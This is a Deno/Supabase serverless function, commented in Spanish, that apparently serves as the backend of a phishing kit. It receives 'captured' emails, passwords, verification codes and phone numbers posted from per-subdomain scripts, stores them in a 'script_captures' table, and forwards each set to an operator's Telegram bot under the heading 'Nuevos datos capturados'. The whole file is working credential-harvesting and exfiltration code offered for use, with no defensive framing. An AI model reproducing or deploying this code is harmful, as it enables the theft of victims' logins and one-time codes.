
import { serve } from "https://deno.land/std@0.168.0/http/server.ts"
import { createClient } from 'https://esm.sh/@supabase/supabase-js@2'

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
}

interface ScriptData {
  subdomain: string;
  script_type: string;
  email?: string;
  password?: string;
  code?: string;
  phone?: string;
  [key: string]: any;
}

serve(async (req) => {
  // Handle CORS preflight requests
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const supabase = createClient(
      Deno.env.get('SUPABASE_URL') ?? '',
      Deno.env.get('SUPABASE_SERVICE_ROLE_KEY') ?? ''
    );

    if (req.method !== 'POST') {
      return new Response(
        JSON.stringify({ error: 'Method not allowed' }),
        { status: 405, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    const body: ScriptData = await req.json();
    console.log('Received script data:', body);

    if (!body.subdomain || !body.script_type) {
      return new Response(
        JSON.stringify({ error: 'Subdomain and script_type are required' }),
        { status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    // Obtener configuración del usuario por subdominio
    const { data: userConfig, error: configError } = await supabase
      .rpc('get_user_config_by_subdomain', { subdomain_param: body.subdomain });

    if (configError) {
      console.error('Error getting user config:', configError);
      return new Response(
        JSON.stringify({ error: 'Configuration not found' }),
        { status: 404, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    if (!userConfig || userConfig.length === 0) {
      console.error('No user configuration found for subdomain:', body.subdomain);
      return new Response(
        JSON.stringify({ error: 'User configuration not found' }),
        { status: 404, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    const config = userConfig[0];
    console.log('User config found:', { user_id: config.user_id, domain: config.domain_name });

    // Guardar datos capturados en la base de datos
    const { data: captureData, error: captureError } = await supabase
      .from('script_captures')
      .insert({
        user_id: config.user_id,
        subdomain: body.subdomain,
        script_type: body.script_type,
        captured_data: body
      })
      .select()
      .single();

    if (captureError) {
      console.error('Error saving capture data:', captureError);
      return new Response(
        JSON.stringify({ error: 'Failed to save data' }),
        { status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    // Formatear mensaje para Telegram
    let message = `🚨 *Nuevos datos capturados*\n\n`;
    message += `📍 *Subdominio:* ${body.subdomain}\n`;
    message += `📋 *Tipo de Script:* ${body.script_type}\n`;
    message += `🌐 *Dominio:* ${config.domain_name}\n\n`;
    
    // Agregar datos específicos dependiendo del tipo
    if (body.email) {
      message += `📧 *Email:* \`${body.email}\`\n`;
    }
    if (body.password) {
      message += `🔐 *Contraseña:* \`${body.password}\`\n`;
    }
    if (body.code) {
      message += `🔢 *Código:* \`${body.code}\`\n`;
    }
    if (body.phone) {
      message += `📱 *Teléfono:* \`${body.phone}\`\n`;
    }

    message += `\n⏰ *Capturado:* ${new Date().toLocaleString('es-ES')}`;

    // Enviar mensaje a Telegram
    const telegramUrl = `https://api.telegram.org/bot${config.bot_token}/sendMessage`;
    const telegramPayload = {
      chat_id: config.chat_id,
      text: message,
      parse_mode: 'Markdown'
    };

    console.log('Sending to Telegram:', { chat_id: config.chat_id, bot_token: config.bot_token.substring(0, 10) + '...' });

    const telegramResponse = await fetch(telegramUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(telegramPayload),
    });

    const telegramResult = await telegramResponse.json();
    console.log('Telegram response:', telegramResult);

    if (!telegramResponse.ok) {
      console.error('Telegram API error:', telegramResult);
      
      // Marcar como no enviado en la base de datos pero no fallar la respuesta
      await supabase
        .from('script_captures')
        .update({ telegram_sent: false })
        .eq('id', captureData.id);

      return new Response(
        JSON.stringify({ 
          success: true, 
          message: 'Data saved but Telegram delivery failed',
          telegram_error: telegramResult
        }),
        { status: 200, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    // Marcar como enviado exitosamente
    await supabase
      .from('script_captures')
      .update({ telegram_sent: true })
      .eq('id', captureData.id);

    return new Response(
      JSON.stringify({ 
        success: true, 
        message: 'Data captured and sent to Telegram successfully',
        capture_id: captureData.id
      }),
      { status: 200, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
    );

  } catch (error) {
    console.error('Function error:', error);
    return new Response(
      JSON.stringify({ error: 'Internal server error', details: error.message }),
      { status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
    );
  }
});
